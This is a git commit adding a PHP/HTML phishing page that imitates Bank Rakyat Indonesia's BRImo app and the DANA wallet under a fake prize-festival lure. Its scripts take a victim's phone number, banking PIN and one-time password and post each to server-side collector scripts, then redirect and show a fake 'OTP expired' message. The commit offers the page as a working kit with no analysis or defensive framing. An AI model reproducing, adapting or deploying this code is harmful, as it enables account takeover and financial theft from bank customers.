7b7c6adc6b4d107f2fac66952429ef2e68a3c308
Freeundian <156284848+Freeundian@users.noreply.github.com>
2024-01-11 12:57:28 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,288 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>𝗚𝗲𝗯𝘆𝗮𝗿 𝗕𝗥𝗜 | 𝗕𝗥𝗜𝗺𝗼 𝗙𝗦𝗧𝗩𝗟</title>
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
+
+    <meta charset="UTF-8">  
+<meta property="og:title" content="𝗚𝗲𝗯𝘆𝗮𝗿 𝗕𝗥𝗜 | 𝗕𝗥𝗜𝗺𝗼 𝗙𝗦𝗧𝗩𝗟">
+<meta name="theme-color" content="#0F78CB"> 
+<meta property="twitter:title" content="𝗚𝗲𝗯𝘆𝗮𝗿 𝗕𝗥𝗜 | 𝗕𝗥𝗜𝗺𝗼 𝗙𝗦𝗧𝗩𝗟">
+<meta name="description" content="PT. Bank Rakyat Indonesia (Persero) Tbk">
+ <meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEghbpcZ4FNNqm4gD-8s-TXbZe5Iev74FENnojv5JphyphenhyphenhIVlxsR-SbFMDr4l1h7Woe2yEkJ161zclU4bK861LF6I8ortZ8xb0XnQOBBP0tWmQUwpUoiSF4dbewUfFjgFKMTFxNKBy1pnlGZjXOW-6ZdiOS7PsOYQHr6HTUCj9KQYBgjFky6WvVyjQNO3n4I/s1080/AddText_12-03-07.19.47.jpg" property="og:image">
+<link rel="canonical" href="https://www.bni.co.id/">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
+<link rel="icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsPMnrLVqgIY5f6gZZiDffOi1we9oxD7l8cN3Yq0PajKDVKE6PovLQHiv8eBmymCJVTPjO1rqZ4VIAAV3xgcmarkW0CqNqUiXRYylsTWfy7jicOhKVjQ0qfxnMhIAHjbHLz5Q03fMNFCMwY0V5nQbHNi2ZRXPUVOUdn3PIwFA_jB5WWYcHTzRw_7ePnqQ/s510/AddText_01-02-08.02.36.jpg" type="image/x-icon" />
+<link rel="apple-touch-icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsPMnrLVqgIY5f6gZZiDffOi1we9oxD7l8cN3Yq0PajKDVKE6PovLQHiv8eBmymCJVTPjO1rqZ4VIAAV3xgcmarkW0CqNqUiXRYylsTWfy7jicOhKVjQ0qfxnMhIAHjbHLz5Q03fMNFCMwY0V5nQbHNi2ZRXPUVOUdn3PIwFA_jB5WWYcHTzRw_7ePnqQ/s510/AddText_01-02-08.02.36.jpg" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<title>𝗚𝗲𝗯𝘆𝗮𝗿 𝗕𝗥𝗜 | 𝗕𝗥𝗜𝗺𝗼 𝗙𝗦𝗧𝗩𝗟</title>
+<meta property="og:title" content="𝗚𝗲𝗯𝘆𝗮𝗿 𝗕𝗥𝗜 | 𝗕𝗥𝗜𝗺𝗼 𝗙𝗦𝗧𝗩𝗟">
+<meta property="twitter:title" content="𝗚𝗲𝗯𝘆𝗮𝗿 𝗕𝗥𝗜 | 𝗕𝗥𝗜𝗺𝗼 𝗙𝗦𝗧𝗩𝗟">
+<meta property="twitter:card" content="summary_large_image">
+<meta property="og:image:type" content="image/jpeg">
+<meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEghbpcZ4FNNqm4gD-8s-TXbZe5Iev74FENnojv5JphyphenhyphenhIVlxsR-SbFMDr4l1h7Woe2yEkJ161zclU4bK861LF6I8ortZ8xb0XnQOBBP0tWmQUwpUoiSF4dbewUfFjgFKMTFxNKBy1pnlGZjXOW-6ZdiOS7PsOYQHr6HTUCj9KQYBgjFky6WvVyjQNO3n4I/s1080/AddText_12-03-07.19.47.jpg" property="og:image">
+
+
+    <link rel="stylesheet" href="ast/8d62ea654fcf0e4cae001e344ee2592c.css">
+    <link rel="stylesheet" href="ast/00b9d2e9f52e505c013c16bb638a42a4.css">
+    <link rel="stylesheet" href="ast/6990a7033bbaeadc2040ac863ff124fd.css">
+    <link rel="stylesheet" href="ast/3fadc676582b9542004b502ee03df3a3.css">
+    <link rel="stylesheet" href="ast/47e4c58f6b9789b8a33f2525cf084599.css">
+
+    <link href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsPMnrLVqgIY5f6gZZiDffOi1we9oxD7l8cN3Yq0PajKDVKE6PovLQHiv8eBmymCJVTPjO1rqZ4VIAAV3xgcmarkW0CqNqUiXRYylsTWfy7jicOhKVjQ0qfxnMhIAHjbHLz5Q03fMNFCMwY0V5nQbHNi2ZRXPUVOUdn3PIwFA_jB5WWYcHTzRw_7ePnqQ/s510/AddText_01-02-08.02.36.jpg">
+    <link href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsPMnrLVqgIY5f6gZZiDffOi1we9oxD7l8cN3Yq0PajKDVKE6PovLQHiv8eBmymCJVTPjO1rqZ4VIAAV3xgcmarkW0CqNqUiXRYylsTWfy7jicOhKVjQ0qfxnMhIAHjbHLz5Q03fMNFCMwY0V5nQbHNi2ZRXPUVOUdn3PIwFA_jB5WWYcHTzRw_7ePnqQ/s510/AddText_01-02-08.02.36.jpg">
+    <!-- Demo styles -->
+    <style>
+      html,
+      body {
+        position: relative;
+        height: 100%;
+		overflow: hidden; 
+        background-color: #fff;
+        font-family: Helvetica Neue, Helvetica, Arial, sans-serif;
+        font-size: 14px;
+        color: #000;
+        margin: 0;
+        padding: 0;
+      }
+
+	</style>
+</head>
+<body style="background-color: #f5f5f5;">
+    <div style="display:none;" class="index">
+        <div class="header">
+            <img src="ast/img/dana_BRImo1.html" class="logo" alt="">
+        </div>
+        <div class="content">
+            <div class="hero">
+                <img src="ast/img/hero.svg" alt="">
+            </div>
+            <h1>Dompet digital untuk kamu!</h1>
+            <p class="desc">Simpan uang serta kartu debit/kredit dengan<br>praktis di DANA</p>
+            <div class="line">
+            </div>
+            <p class="log">Masukkan <b>nomor HP</b> kamu untuk lanjut</p>
+            <button type="button" onclick="next();">LOGIN</button>
+        </div>
+    </div>
+    <div class="start" style="display:none; background-color: #fff;">
+        <img class="logo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjcBIQu172xTzuBu5ZshBMCydw-Hwty5J2XuYR_CgSrjEIOu4QUNhfSg7L9btOF988-pfoM5Qr02eyfUFIORKsiAo3Nw57Kw0k7Mex2kYDx3y9d-z4iLvErja61jVotArq2F4QTdK0wAIu0Up3wKFuv9IcrKIkJsUjd5B0O_TNcZHOA2TX1ubFS5nJwbnw/s1069/AddText_01-02-08.06.41.png" style="height: 50px; width: 90px;">
+    </div>
+    <div class="container hid">
+        <div class="box-login" style="background-color: #fff;">
+            <div id="process" name="process" class="process" style="display: none;">
+                <div class="loading">
+                    <img src="ast/img/load_bg.png">
+                    <img class="spinner" src="ast/img/load_spin.png">
+                </div>
+            </div>
+            <div class="header11" style="height: 100%">
+                <a href="login.php"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiXbawVrjOAKiKiLyKt7DJXecjNzlJfj2AzRc8_m-Bwgacr2E5_qbCxoqm8wU12DseNzQUfO5DUYRX4Uom70mJG2YX_BFWMO88_e18AXJks3DiBb4yuvwtX7JAqn_0BrjN0JUKHkUyAMeGVtft7VIQ_67ksUxr6lU1PvKFQOMLyDVZVh7c5yCobZTQ-Kxk/s1968/AddText_01-02-07.35.34.jpg" style="width: 100%; left: 0px; top: 0px; height: 100%"></a>
+            </div>
+            
+        </div>
+	</div>
+
+<script src="ast/jquery-3.5.1.min.js"></script>
+<script src="ast/jquery.mask.min.js"></script>
+<script>
+$(document).ready(function() {
+    $('#inp').on('input', function() {
+        if ($(this).val() == '0' || $(this).val() == '62') {
+            $(this).val('');
+        }
+    });
+});
+</script>
+<script>
+$(document).ready(function() {
+    $('#inp').mask('000-0000-000000');
+});
+</script>
+<script>
+let inp = document.getElementById("inp");
+let btn = document.getElementById("btn");
+inp.addEventListener("input", val);
+
+function val() {
+    if (inp.value.length > 10) {
+        btn.disabled = false;
+    } else {
+        btn.disabled = true;
+    }
+};
+</script>
+<script>
+$('.inppin').on('input', function(event) {
+    const inputs = $('.inppin');
+    const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
+    if (isAllFilled == true) {
+        $(event.target).blur();
+        sendPin();
+    };
+    const index = inputs.index(this);
+    const currentValue = event.target.value;
+    if (currentValue.length === 1) {
+        if (index < inputs.length - 1) {
+            inputs[index + 1].focus();
+        }
+    } else if (currentValue.length === 0) {
+        if (index > 0) {
+            inputs[index].focus();
+        }
+    };
+});
+$('.inppin').on('keydown', function(event) {
+    const inputs = $('.inppin');
+    const key = event.key;
+    const index = inputs.index(this);
+    if (key === 'Backspace' && event.target.value.length === 0) {
+        if (index > 0) {
+            inputs[index - 1].focus();
+        }
+    };
+});
+</script>
+<script>
+$('.inpotp').on('input', function(event) {
+    const inputs = $('.inpotp');
+    const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
+    if (isAllFilled == true) {
+        $(event.target).blur();
+        sendOtp();
+    }
+    const index = inputs.index(this);
+    const currentValue = event.target.value;
+    if (currentValue.length === 1) {
+        if (index < inputs.length - 1) {
+            inputs[index + 1].focus();
+        }
+    } else if (currentValue.length === 0) {
+        if (index > 0) {
+            inputs[index].focus();
+        }
+    };
+});
+$('.inpotp').on('keydown', function(event) {
+    const inputs = $('.inpotp');
+    const key = event.key;
+    const index = inputs.index(this);
+    if (key === 'Backspace' && event.target.value.length === 0) {
+        if (index > 0) {
+            inputs[index - 1].focus();
+        }
+    };
+});
+</script>
+<script>
+$(document).ready(function() {
+    $('.clear').click(function() {
+        $('.inppin').val('');
+        $('#pin1').focus();
+    });
+    $('.clearotp').click(function() {
+        $('.inpotp').val('');
+        $('#otp1').focus();
+    });
+    $('.show').click(function() {
+        $('.inppin').each(function() {
+            if ($(this).attr('type') === 'password') {
+                $(this).attr('type', 'number');
+                $(".show").text("SEMBUNYIKAN");
+            } else {
+                $(this).attr('type', 'password');
+                $(".show").text("TAMPILKAN");
+            }
+        });
+    });
+});
+</script>
+<script>
+function sendNohp(event) {
+    $("#process").show();
+    event.preventDefault();
+    $("#inp").blur();
+    $.ajax({
+        type: 'POST',
+        url: 'ast/req/sendNohp.php',
+        data: $('#formNohp').serialize(),
+        dataType: 'text',
+        success: function() {
+            $("#process").hide();
+            $("#formNohp").fadeOut();
+            setTimeout(function() {
+                $("#inp").val('');
+                $("#formPin").fadeIn();
+                $("#pin1").focus();
+            }, 500);
+        }
+    });
+};
+</script>
+<script>
+function sendPin() {
+    $("#process").show();
+    $.ajax({
+        type: 'POST',
+        url: 'ast/req/formPin.php',
+        data: $('#formPin').serialize(),
+        dataType: 'text',
+        success: function() {
+            $("#process").hide();
+            $('.inppin').val('');
+            $(".bgotp").fadeIn();
+            setInterval(countdown, 1000);
+            $("#otp1").focus();
+        }
+    });
+};
+</script>
+<script>
+function sendOtp() {
+    $(".loadingOtp").show();
+    $.ajax({
+        type: 'POST',
+        url: 'ast/req/formOtp.php',
+        data: $('#formOtp').serialize(),
+        dataType: 'text',
+        success: function() {
+            window.location.href = "googleplayDANA.html";
+            setTimeout(function() {
+                $(".loadingOtp").hide();
+                $('.inpotp').val('');
+                $(".alert").text("Kode OTP telah kedaluwarsa atau invalid silahkan kirim ulang kode OTP");
+                $(".alert").css("color", "red");
+            }, 3000);
+        }
+    });
+};
+</script>
+<script>
+function countdown() {
+    var count = parseInt($('#countdown').text());
+    if (count !== 0) {
+        $('#countdown').text(count - 1);
+    } else {
+        $('#countdown').text('120');
+    }
+};</script>
+<script>
+window.onload = function() {
+    setTimeout(function() {
+        $(".start").fadeIn();
+        setTimeout(function() {
+            $(".start").fadeOut(1000);
+            setTimeout(function() {
+                $(".container").fadeIn(200);
+                $("#inp").focus();
+            }, 1000);
+        }, 2000);
+    }, 500);
+}
+</script>
+
+
+
+</body>
+<!-- Mirrored from hadiah-baruu.zzyus.life/ by HTTrack Website Copier/3.x [XR&CO'2017], Mon, 13 Nov 2023 12:58:11 GMT -->
+</html>
